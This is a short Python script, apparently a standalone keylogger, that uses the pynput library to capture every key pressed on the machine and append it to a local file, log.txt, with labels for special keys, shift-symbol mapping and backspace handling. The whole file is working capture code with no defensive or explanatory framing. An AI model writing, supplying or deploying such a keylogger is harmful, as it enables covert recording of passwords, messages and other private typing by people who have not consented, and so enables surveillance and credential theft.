from pynput.keyboard import Listener,Key

def write_to_file(key):
    global shift_pressed
    letter = str(key)
    letter = letter.replace("'", "")

    if key in (Key.shift, Key.shift_r, Key.shift_l):
        shift_pressed = True
        return
    elif key == Key.space:
        letter = ' '
    elif key == Key.enter:
        letter = '\n'
    elif key == Key.backspace:
        with open("log.txt", "rb+") as f:
            f.seek(-1, 2)
            f.truncate()
        return
    elif key == Key.esc:
        letter = "[ESC]"
    elif key == Key.insert:
        letter = "[INSERT]"
    elif key == Key.delete:
        letter = "[DELETE]"
    elif key == Key.home:
        letter = "[HOME]"
    elif key == Key.end:
        letter = "[END]"
    elif key == Key.page_up:
        letter = "[PAGE_UP]"
    elif key == Key.page_down:
        letter = "[PAGE_DOWN]"
    elif key == Key.up:
        letter = "[UP_ARROW]"
    elif key == Key.down:
        letter = "[DOWN_ARROW]"
    elif key == Key.left:
        letter = "[LEFT_ARROW]"
    elif key == Key.right:
        letter = "[RIGHT_ARROW]"
    elif key == Key.print_screen:
        letter = "[PRINT_SCREEN]"
    elif key == Key.pause:
        letter = "[PAUSE]"
    elif key == Key.menu:
        letter = "[MENU]"
    elif key in (Key.alt_l, Key.alt_r):
        letter = "[ALT]"
    elif key in (Key.cmd, Key.cmd_l, Key.cmd_r):
        letter = "[CMD]"
    elif shift_pressed:
        if letter.islower():
            letter = letter.upper()
        symbol_map = {
            '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
            '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
            '`': '~', '-': '_', '=': '+', '[': '{', ']': '}',
            '\\': '|', ';': ':', "'": '"', ',': '<', '.': '>',
            '/': '?'
        }
        letter = symbol_map.get(letter, letter)
        shift_pressed = False
    elif letter.startswith("Key."):
        return

    with open("log.txt", 'a') as f:
         f.write(letter)

with Listener(on_press= write_to_file) as l:
    l.join()